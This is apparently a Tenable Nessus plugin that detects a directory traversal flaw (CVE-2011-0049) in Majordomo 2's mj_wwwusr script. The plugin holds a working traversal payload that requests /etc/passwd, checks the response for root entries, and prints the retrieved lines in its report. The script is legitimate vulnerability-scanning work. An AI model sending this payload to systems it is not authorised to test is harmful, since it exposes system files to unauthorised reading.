#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(52000);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2016/11/28 21:06:39 $");

  script_cve_id("CVE-2011-0049", "CVE-2011-0063");
  script_bugtraq_id(46127);
  script_osvdb_id(71087);
  script_xref(name:"CERT", value:"363726");
  script_xref(name:"EDB-ID", value:"16103");
  script_xref(name:"Secunia", value:"43125");
  script_xref(name:"Secunia", value:"43631");

  script_name(english:"Majordomo 2 _list_file_get() Function Traversal Arbitrary File Access");
  script_summary(english:"Tries to grab /etc/passwd.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a web application that contains a
directory traversal vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Majordomo 2 on the remote host fails to sanitize input
to the 'extra' parameter of the 'mj_wwwusr' script before using it to
return the contents of a file.

An attacker can leverage this issue using a directory traversal
sequence to view arbitrary files on the affected host within the
context of the web server.  Information harvested may aid in launching
further attacks.

Note that this issue is also reportedly exploitable through
Majordomo's email interface, although Nessus has not checked for
that."
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to Majordomo 2 build 20110204 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Majordomo 2 File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
  # http://web.archive.org/web/20110726024342/https://sitewat.ch/en/Advisory/View/1
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1456bb52");
  script_set_attribute(
    attribute:"see_also",
    value:"http://attrition.org/pipermail/vim/2011-February/002502.html"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://seclists.org/bugtraq/2011/Mar/93"
  );

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/02/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/02/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/02/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "majordomo_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/majordomo");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

# Check that Majordomo is installed on this port.
port = get_http_port(default:80);

install = get_install_from_kb(appname:"majordomo", port:port, exit_on_fail:TRUE);
dir = install["dir"];

# Try and exploit the path traversal.
exploited = FALSE;
dotdot = "./../././../././../././../././../././../././../././../././../././../././../.";
url = "/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=" + dotdot + "/etc/passwd";

# Make the GET request for /etc/passwd.
res = http_send_recv3(
  item         : dir + url,
  method       : "GET",
  port         : port,
  exit_on_fail : TRUE
);

# Check if we got /etc/passwd.
if (!egrep(string:res[2], pattern:"root:.*:0:[01]:"))
  exit(0, "The Majordomo install at "+build_url(port:port, qs:dir+'/mj_wwwusr')+" is not affected.");

if (report_verbosity > 0)
{
  trailer = "";
  if (report_verbosity > 1)
  {
    bar = crap(data:"-", length:30);
    trailer +=
      'Here are the contents of the /etc/passwd file :\n\n'+
      bar + " snip " + bar + '\n';
    trailer += egrep(string:res[2], pattern:"^([^:]*:){6}[^:]*$");
    trailer +=
      bar + " snip " + bar + '\n';
  }

  report = get_vuln_report(trailer:trailer, items:install["dir"] + url, port:port);

  security_warning(port:port, extra:report);
}
else security_warning(port);
